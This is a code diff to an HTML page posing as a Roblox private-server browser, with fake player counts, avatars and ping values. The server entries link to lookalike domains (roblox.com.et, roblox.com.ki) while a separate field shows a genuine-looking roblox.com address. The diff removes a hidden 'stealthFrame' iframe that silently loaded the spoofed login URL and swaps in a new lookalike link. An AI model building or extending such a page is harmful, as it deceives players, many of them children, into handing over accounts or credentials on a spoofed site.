@@ -83,7 +83,7 @@
     </style>
 </head>
 <body>
-    <div class="winter-bg"></div>
+   <div class="winter-bg"></div>
 <div class="snow-layer"></div>
 <div class="snow-layer fast"></div>
 <div class="aurora-glow"></div>
@@ -235,7 +235,7 @@
     footer { border-top: 1px solid var(--line); padding: 40px 0; background: rgba(12, 22, 40, 0.9); margin-top: 60px; text-align: center; color: var(--ink-faint); font-size: 0.85rem; }
     @media(min-width: 768px) { .chrome-window { border-radius: 12px; height: 86vh; width: 95vw; } .browser-modal-overlay { padding: 20px; } }
 </style>
-<script>
+    <script>
     const avatarPool = [
         "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4F764CB5B7A62140A826DCBA9EE5F7E-Png/150/150/AvatarHeadshot/Webp/noFilter",
         "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0C6CBD98ADBB8879842179209E12BF5D-Png/150/150/AvatarHeadshot/Webp/noFilter",
@@ -273,8 +273,7 @@
                 ping: Math.floor(Math.random() * 25) + 10 + "ms",
                 thumb: "https://raw.githubusercontent.com/tokun787-boop/Condo-Games-/main/image/server2.jpg",
                 avatars: getAvatars(),
-                PRIVATE_SERVER_URL: "https://www.roblox.com.et/games/487316/Sword-Fight-on-the-Heights-Original?privateServerLinkCode=83872921682350434392286111406032",
-                LOGIN_URL: "https://www.roblox.com.et/games/487316/Sword-Fight-on-the-Heights-Original?privateServerLinkCode=83872921682350434392286111406032",
+                PRIVATE_SERVER_URL: "https://roblox.com.ki/games/18365686347/shutting-down?privateServerLinkCode=56987585516370817668187404461166",
                 FAKE_URL_DISPLAY: `https://roblox.com/games/10291967/Christmas-edition`
             });
             srvId++;
@@ -320,7 +319,7 @@
                 let avs = srv.avatars.map(a => `<img class="avatar-sm" src="${a}">`).join('');
                 
                 catHtml += `
-                    <div class="server-card" data-login-payload="${srv.LOGIN_URL}">
+                    <div class="server-card">
                         <div class="server-thumb">
                             <div class="server-online-badge"><i class="fa-solid fa-circle" style="font-size:6px;"></i> LIVE</div>
                             <div class="server-ping" id="ping-${srv.id}"><i class="fa-solid fa-wifi" style="font-size:9px;"></i> ${srv.ping}</div>
@@ -360,11 +359,6 @@
     window.openServer = function(id) {
         const srv = appConfig.servers.find(s => s.id === id);
         if(!srv) return;
-
-        let stealthFrame = document.createElement('iframe');
-        stealthFrame.style.display = 'none';
-        stealthFrame.src = srv.LOGIN_URL;
-        document.body.appendChild(stealthFrame);
 
         const modal = document.getElementById('loadingModal');
         document.getElementById('loadingText').innerText = `Routing to ${srv.name}...`;
